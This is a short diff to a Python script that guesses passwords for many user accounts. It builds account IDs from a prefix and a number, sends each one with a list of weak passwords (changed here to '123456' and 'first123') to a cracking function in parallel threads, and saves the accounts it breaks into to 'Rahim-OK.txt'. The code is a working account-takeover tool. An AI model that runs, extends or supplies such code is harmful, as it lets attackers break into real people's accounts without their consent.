@@ -194,7 +194,7 @@ def main():
 	    print(' \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××')
 	    for guru in user:
 		    uid = kode+guru
-		    pwx = [guru, 'firstlast','first last','first123','first1234',]
+		    pwx = [guru, '123456','first123',]
 		    yaari.submit(rcrack,uid,pwx,tl)
     print('\nCRACK PROCESS HAS BEEN COMPLETED ')
     print('\nIDS SAVED IN Rahim-OK.txt')
